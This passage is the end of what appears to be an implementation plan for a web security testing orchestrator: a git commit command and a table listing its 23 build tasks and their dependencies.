git add wstg_orchestrator/main.py
git commit -m "feat: wire all modules and reporting into orchestrator"
```

---

## Execution Summary

| Task | Component | Dependencies |
|------|-----------|-------------|
| 1 | Project scaffold | None |
| 2 | StateManager | Task 1 |
| 3 | ConfigLoader + ScopeChecker | Task 1 |
| 4 | RateLimiter | Task 1 |
| 5 | CommandRunner | Task 1 |
| 6 | EvidenceLogger | Task 1 |
| 7 | HttpClient | Tasks 3, 4 |
| 8 | ParserUtils | Task 1 |
| 9 | CallbackServer | Task 1 |
| 10 | ScopeBuilder | Task 3 |
| 11 | BaseModule | Tasks 2, 3, 4, 6, 9 |
| 12 | Orchestrator | Tasks 2-11 |
| 13 | ReconModule | Tasks 5, 7, 8, 11 |
| 14-21 | Remaining modules | Task 11, 13 |
| 22 | ReportGenerator | Task 2 |
| 23 | Final wiring | All |
